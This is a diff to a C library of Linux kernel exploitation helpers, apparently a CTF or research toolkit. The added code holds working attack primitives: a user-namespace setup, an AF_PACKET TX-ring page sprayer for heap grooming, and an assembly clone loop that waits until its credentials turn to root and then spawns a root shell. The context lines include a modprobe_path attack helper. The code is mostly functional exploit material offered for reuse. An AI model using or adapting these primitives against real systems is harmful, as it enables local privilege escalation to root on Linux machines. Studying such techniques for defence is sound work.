@@ -37,10 +37,10 @@ char * hex(size_t num){
     snprintf(buf,0x20,"%p",num);
     return buf;
 }
-void success(size_t val){
+void success(const char *text){
     // Green color code
     printf("\033[0;32m[+] ");
-    printf("%p", val);
+    printf("%s", text);
     // Reset to default color
     printf("\033[0m\n");
 }
@@ -96,6 +96,7 @@ void modprobeAtk(char * path, char * cmd){
     snprintf(buf,0x400-1,"chmod 777 %s/funky_guy; chmod 777 %s/n132; %s/funky_guy 2>%s/null;",path,path,path,path);
     system(buf);
 }
+
 /*
 Userfaultfd for race condition,
 Usage:
@@ -590,4 +591,182 @@ void magic(){
     printf("0x");
     fflush(stdout);
     leak_kallsyms("swapgs_restore_regs_and_return_to_usermode");
+}
+
+
+/*
+    Page Allocation
+    Worked in Sandbox
+    
+*/
+// https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
+void sandbox()
+{   //unshare -r
+    uid_t uid = getuid();
+    gid_t gid = getgid();
+    int temp;
+    char edit[0x100];
+    unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET);
+
+    temp = open("/proc/self/setgroups", O_WRONLY);
+    write(temp, "deny", strlen("deny"));
+    close(temp);
+
+    temp = open("/proc/self/uid_map", O_WRONLY);
+    snprintf(edit, sizeof(edit), "0 %d 1", uid);
+    write(temp, edit, strlen(edit));
+    close(temp);
+
+    temp = open("/proc/self/gid_map", O_WRONLY);
+    snprintf(edit, sizeof(edit), "0 %d 1", gid);
+    write(temp, edit, strlen(edit));
+    close(temp);
+    return;
+}
+
+/*
+    Usage:  
+    ```
+    setSockPageAllocator();
+    for(int i = 0 ; i < 0x100 ; i++)
+        send_spray_cmd(ALLOC_PAGE,i);
+    ```
+ */
+int sock_allocator_fd_child[2],sock_allocator_fd_parent[2];
+#define INITIAL_PAGE_SPRAY 1000
+int socketfds[INITIAL_PAGE_SPRAY];
+enum spray_cmd {
+    ALLOC_PAGE,
+    FREE_PAGE,
+    EXIT_SPRAY,
+};
+typedef struct
+{
+    enum spray_cmd cmd;
+    int32_t idx;
+}ipc_req_t;
+int _alloc_pages_via_sock(uint32_t size, uint32_t n)
+{
+    struct tpacket_req req;
+    int32_t socketfd, version;
+
+    socketfd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
+    if (socketfd < 0)
+    {
+        perror("bad socket");
+        exit(-1);
+    }
+
+    version = TPACKET_V1;
+
+    if (setsockopt(socketfd, SOL_PACKET, PACKET_VERSION, &version, sizeof(version)) < 0)
+    {
+        perror("setsockopt PACKET_VERSION failed");
+        exit(-1);
+    }
+
+    assert(size % 4096 == 0);
+
+    memset(&req, 0, sizeof(req));
+
+    req.tp_block_size = size;
+    req.tp_block_nr = n;
+    req.tp_frame_size = 4096;
+    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;
+
+    if (setsockopt(socketfd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req)) < 0)
+    {
+        perror("setsockopt PACKET_TX_RING failed");
+        exit(-1);
+    }
+
+    return socketfd;
+}
+void _spray_comm_handler()
+{
+    ipc_req_t req;
+    int32_t result;
+
+    do {
+        read(sock_allocator_fd_child[0], &req, sizeof(req));
+        assert(req.idx < INITIAL_PAGE_SPRAY);
+        if (req.cmd == ALLOC_PAGE)
+        {
+            socketfds[req.idx] = _alloc_pages_via_sock(4096, 1);
+        }
+        else if (req.cmd == FREE_PAGE)
+        {
+            close(socketfds[req.idx]);
+        }
+        result = req.idx;
+        write(sock_allocator_fd_parent[1], &result, sizeof(result));
+    } while(req.cmd != EXIT_SPRAY);
+
+}
+void send_spray_cmd(enum spray_cmd cmd, int idx)
+{
+    ipc_req_t req;
+    int32_t result;
+
+    req.cmd = cmd;
+    req.idx = idx;
+    write(sock_allocator_fd_child[1], &req, sizeof(req));
+    read(sock_allocator_fd_parent[0], &result, sizeof(result));
+    assert(result == idx);
+}
+void setSockPageAllocator(){
+    pipe(sock_allocator_fd_child);
+    pipe(sock_allocator_fd_parent);
+    if (!fork())
+    {
+        // unshare -r 
+        sandbox();
+        // Setup a hander in the child process waiting for the commands
+        _spray_comm_handler();
+        exit(1);
+    }
+}
+/*
+    This function clone a process with little noise and 
+    keeps checking if the cred is modified to root. If it's changed to root,
+    it returns a root shell.
+*/
+#define cloneRoot_FLAG CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND
+
+void _cloneRootShell(void){
+    success("Root!");
+    seteuid(0);
+    system("/bin/sh");
+    sleep(1000);
+}
+__attribute__((naked)) size_t  _cloneRoot(size_t flag,size_t shell_func){
+
+    asm(
+        "mov r15, rsi;"
+        "xor rsi, rsi;"
+        "xor rdx, rdx;"
+        "xor r8, r8;"
+        "xor r10, r10;"
+        "xor r9, r9;"
+        "mov rax, 56;"
+        "syscall;"
+        "cmp rax,0;"
+        "jl OUT;"
+        "je OUT;"
+        "REPEAT:"
+        "mov rax, 102;"
+        "syscall;"
+        "cmp rax,0;"
+        "jne REPEAT;"
+        "jmp GG;"
+        "OUT:"
+        "ret;"
+        "GG:"
+        "jmp r15;"
+    );
+    while(1);
+}
+void cloneRoot(void )
+{
+    _cloneRoot(cloneRoot_FLAG,_cloneRootShell);
 }
